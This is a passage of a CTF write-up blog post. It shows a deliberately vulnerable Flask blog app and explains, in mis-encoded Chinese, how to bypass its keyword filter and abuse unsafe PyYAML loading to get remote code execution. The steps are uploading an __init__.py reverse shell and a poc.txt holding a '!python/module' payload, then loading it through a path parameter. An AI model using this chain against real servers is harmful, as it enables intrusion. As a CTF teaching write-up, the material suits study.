class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, render_template, request, session</span><br><span class="line"><span class="keyword">from</span> yaml <span class="keyword">import</span> Loader</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit</span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">blog = Blueprint(<span class="string">&quot;blog&quot;</span>, __name__, url_prefix=<span class="string">&quot;/blog&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/writeBlog&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeblog</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;writeBlog.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()</span><br><span class="line">        blog = Blog(title=title, text=text, create_time=create_time, user_id=user.<span class="built_in">id</span>)</span><br><span class="line">        db.session.add(blog)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.create_time == create_time).first()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=blog.<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)</span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)</span><br><span class="line">        file.save(filePath)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/showBlog/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showBlog</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()</span><br><span class="line">    comment = Comment.query.<span class="built_in">filter</span>(Comment.blog_id == blog.<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;showBlog.html&quot;</span>, blog=blog, comment=comment)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/blogAll&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blogAll</span>():</span><br><span class="line">    blogList = Blog.query.order_by(Blog.create_time.desc()).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blogAll.html&#x27;</span>, blogList=blogList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/update/&lt;id&gt;&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;updateBlog.html&#x27;</span>, blog=blog)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()</span><br><span class="line">        blog.title = title</span><br><span class="line">        blog.text = text</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/delete/&lt;id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()</span><br><span class="line">    db.session.delete(blog)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;åˆ é™¤æˆåŠŸï¼&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/myBlog&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myBlog</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()</span><br><span class="line">    blogList = Blog.query.<span class="built_in">filter</span>(Blog.user_id == user.<span class="built_in">id</span>).order_by(Blog.create_time.desc()).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myBlog.html&quot;</span>, blogList=blogList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/comment&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comment</span>():</span><br><span class="line">    text = request.values.get(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">    blogId = request.values.get(<span class="string">&#x27;blogId&#x27;</span>)</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()</span><br><span class="line">    comment = Comment(text=text, create_time=create_time, blog_id=blogId, user_id=user.<span class="built_in">id</span>)</span><br><span class="line">    db.session.add(comment)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;è¯„è®ºæˆåŠŸï¼&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/myComment&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myComment</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()</span><br><span class="line">    commentList = Comment.query.<span class="built_in">filter</span>(Comment.user_id == user.<span class="built_in">id</span>).order_by(Comment.create_time.desc()).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myComment.html&quot;</span>, commentList=commentList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/deleteCom/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteCom</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    com = Comment.query.<span class="built_in">filter</span>(Comment.<span class="built_in">id</span> == <span class="built_in">id</span>).first()</span><br><span class="line">    db.session.delete(com)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;åˆ é™¤æˆåŠŸï¼&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f = f.read()</span><br><span class="line">                <span class="keyword">if</span> waf(f):</span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šå½“ä½ çœ‹åˆ°è¿™å¥è¯æ—¶ï¼Œè¿˜æ²¡æœ‰æ‹¿åˆ°flagï¼Œé‚£å°±èµ¶ç´§é‡å¼€ç¯å¢ƒå§&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šä½ è¯´å¾—ä¸å¯¹&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼š&#x27;</span>+<span class="built_in">str</span>(e))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)</span><br><span class="line">            saying = random.choice(sayings)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure>
<p>ä¸éš¾å‘ç°blog.pyä¸­å­˜åœ¨ä¸€ä¸ªpyyamlååºåˆ—åŒ–çš„åˆ©ç”¨ï¼Œæœ‰å…³æ–‡ç« å¯ä»¥å‚è€ƒï¼š</p>
<p>ä½†æ˜¯å®¡è®¡ä¸€ä¸‹ä¹Ÿå¯ä»¥å‘ç°æœ‰wafè¿›è¡Œè¿‡æ»¤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨çš„å‡ ä¸ªæ ‡ç­¾è¢«banäº†ï¼Œåªå‰©ä¸‹äº†<code>module</code>æ ‡ç­¾ï¼Œ<code>python/module</code>æ ‡ç­¾å¯¹åº”çš„æ–¹æ³•æ˜¯<code>construct_python_module</code>é‡Œé¢è°ƒç”¨äº†<code>find_python_module</code>ç­‰ä»·äº<code>import</code>ï¼Œä¹Ÿå°±æ˜¯å¯¼åŒ…ï¼Œåˆ©ç”¨çš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992535112-c3fc592b-caba-43b9-ab45-0b941f731716.png#averageHue=%23050505&clientId=u6c0fe869-b4eb-4&from=paste&id=ucdbefbaf&originHeight=1034&originWidth=866&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u1fa7da2a-4afb-4966-986e-0404651dc48&title="><br>é‡ç‚¹æ˜¯<strong>å¦‚æœuploadsç›®å½•ä¸‹æœ‰__init__.py</strong>ï¼Œé‚£ä¹ˆpayloadç›´æ¥å°±æ˜¯<code>!!Python/module:uploads</code>å³å¯è§¦å‘<br>ç›®å‰æˆ‘ä»¬ç½‘é¡µæ‰€åœ¨çš„åœ°å€æ˜¯<code>/app</code>æ–‡ä»¶å¤¹ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ–‡ä»¶å¤¹æ˜¯<code>/app/static/upload</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ æ–‡ä»¶<br>æ€è·¯å°±æ›´åŠ æ¸…æ™°äº†ï¼Œä¸Šä¼ __init__.pyï¼Œé‡Œé¢æ„é€ ä¸€ä¸ªåå¼¹shell<br>å†ä¸Šä¼ ä¸€ä¸ª<code>poc.txt</code>é‡Œé¢å°±å†™<code>!python/module:static.upload</code>å³å¯<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992803003-bd541111-d3a1-4089-988e-6b3b447ea7ef.png#averageHue=%23f7f6f6&clientId=u6c0fe869-b4eb-4&from=paste&height=366&id=uac1b14cc&name=image.png&originHeight=458&originWidth=1302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71139&status=done&style=none&taskId=u0629a3b5-3bd5-47a4-a30a-5cfbe585d8b&title=&width=1041.6" alt="image.png"><br>åœ¨å†™ä¸€ä¸ª__init__.py:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992862677-e97a9bf4-ca49-4546-a64f-f10de3dcfd75.png#averageHue=%23f7f6f6&clientId=u6c0fe869-b4eb-4&from=paste&height=419&id=ud42a477b&name=image.png&originHeight=524&originWidth=1266&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81260&status=done&style=none&taskId=u98420b2b-ac16-491c-ad31-5861e760b38&title=&width=1012.8" alt="image.png"><br>å†å»blog&#x2F;sayingè·¯ç”±å»ä¼ é€’pathå‚æ•°<code>static/upload/poc.txt</code>ï¼Œåœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸‹7777ç«¯å£ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992918698-8b05eed7-dcb6-4637-b45c-6e600ac6dce9.png#averageHue=%23181615&clientId=u6c0fe869-b4eb-4&from=paste&height=89&id=u2cb13e33&name=image.png&originHeight=111&originWidth=950&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10079&status=done&style=none&taskId=u5ddacce2-16ec-4e38-951a-68685575348&title=&width=760" alt="image.png"><br>æˆåŠŸåå¼¹ï¼æ ¹ç›®å½•ä¸‹ç›´æ¥å¾—åˆ°flagå’¯ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992934609-cd4cd191-d4a2-47df-914d-e3d5fa827f44.png#averageHue=%230f0d0b&clientId=u6c0fe869-b4eb-4&from=paste&height=65&id=u359cf785&name=image.png&originHeight=81&originWidth=647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7337&status=done&style=none&taskId=u0741534a-0455-43ca-b8de-c725cd1797a&title=&width=517.6" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/DASCTF/" class="tag">#DASCTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/Support%EF%BC%882_3%EF%BC%89/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Support(2/3)</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/DASCTF%20X%20CBCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">DASCTF äº”æœˆå‡ºé¢˜äººæŒ‘æˆ˜èµ›</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>